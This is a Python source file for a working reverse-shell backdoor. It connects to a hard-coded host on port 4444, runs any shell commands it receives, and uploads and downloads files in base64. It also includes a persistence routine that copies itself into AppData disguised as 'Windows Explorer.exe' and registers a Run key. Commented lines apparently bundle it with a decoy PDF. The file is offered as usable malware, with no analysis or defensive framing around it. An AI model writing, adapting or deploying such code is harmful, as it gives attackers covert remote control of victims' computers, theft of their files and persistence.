import socket
import subprocess, os
import json
import base64
import shutil
import sys
class Backdoor:
	def __init__(self,ip,port):
		# self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def become_persistent(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell=True)
	
	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_recieve(self):
		json_data = b""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024) # the size of data in bytes
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self,command):
		return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

	def change_working_directory_to(self,path):
		os.chdir(path)
		return "[+] changing working directory to " + path

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def write_file(self,path,content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Uploaded successfully"

	def run(self):	
		while True:
			
			try:
				command = self.reliable_recieve()
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1]).decode()
				elif command[0] == "upload":
					command_result = self.write_file(command[1],command[2])
				else:
					command_result = self.execute_system_command(command).decode()
			except Exception as error:
				command_result = "[-] Oops something went wrong"
				print(command_result,error)
			
			self.reliable_send(command_result)

		connection.close()



# filename = sys._MEIPASS + "\shayeri.pdf"
# subprocess.Popen(filename,shell=True)
try:
	my_backdoor = Backdoor("192.168.110.128",4444)
	my_backdoor.run()
except Exception:
	sys.exit()